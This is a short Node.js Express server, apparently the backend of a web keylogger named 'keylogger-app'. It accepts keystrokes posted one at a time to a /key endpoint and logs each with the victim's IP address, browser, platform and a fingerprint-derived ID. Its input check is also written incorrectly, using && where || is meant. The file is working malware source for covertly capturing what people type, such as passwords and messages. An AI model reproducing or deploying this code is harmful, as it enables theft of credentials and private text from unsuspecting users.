const express = require('express');
const bodyParser = require('body-parser')
const useragent = require('express-useragent');
const CRC32 = require('crc-32');

var jsonParser = bodyParser.json();

var app = express();
app.use(express.static('static'));
app.use(useragent.express());

app.post('/key', jsonParser, function(req, res) {
  if(typeof(req.body.keystroke) !== 'string' && req.body.keystroke.length !== 1) {
    res.sendStatus(200);
    return;
  }

  let a = req.useragent;
  let crc = CRC32.str(JSON.stringify(a) + req.ip);
  let uid = (crc < 0 ? (0xFFFFFFFF + crc + 1) : crc).toString(16);
  console.log(uid.toString(16) + ' => ' + a.platform + ' ' + a.browser + ' ' + a.version + ' ' + req.ip + ' ' + req.body.keystroke);
  res.sendStatus(200);
  return;
});

app.listen(3000, function () {
  console.log('keylogger-app is listening on port 3000');
});

